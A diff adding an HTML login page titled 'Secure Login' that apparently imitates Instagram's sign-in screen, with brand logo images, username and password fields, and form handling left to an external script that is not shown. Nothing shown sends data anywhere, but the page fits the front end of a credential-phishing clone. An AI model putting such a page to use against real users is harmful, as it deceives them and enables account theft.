@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="ru">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Secure Login</title>
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <main class="screen">
+      <section class="login-card">
+        <p class="language">English (US)</p>
+      <img src="./insta.webp" alt="" class="logo">
+
+        <form id="loginForm">
+          <input
+            id="identifier"
+            name="identifier"
+            type="text"
+            placeholder="Username, email or mobile number"
+            autocomplete="username"
+            required
+          />
+          <input
+            id="password"
+            name="password"
+            type="password"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          />
+          <button type="submit">Log in</button>
+        </form>
+
+        <a href="#" class="help-link">Forgot password?</a>
+        <button class="outline-btn" type="button">Create new account</button>
+        <img style="width: 60px; height: 12px; margin:0 auto;" src="./meta.webp" alt="" class="google-logo">
+      </section>
+    </main>
+
+  <script src="./script.js"></script>
+  </body>
+</html>
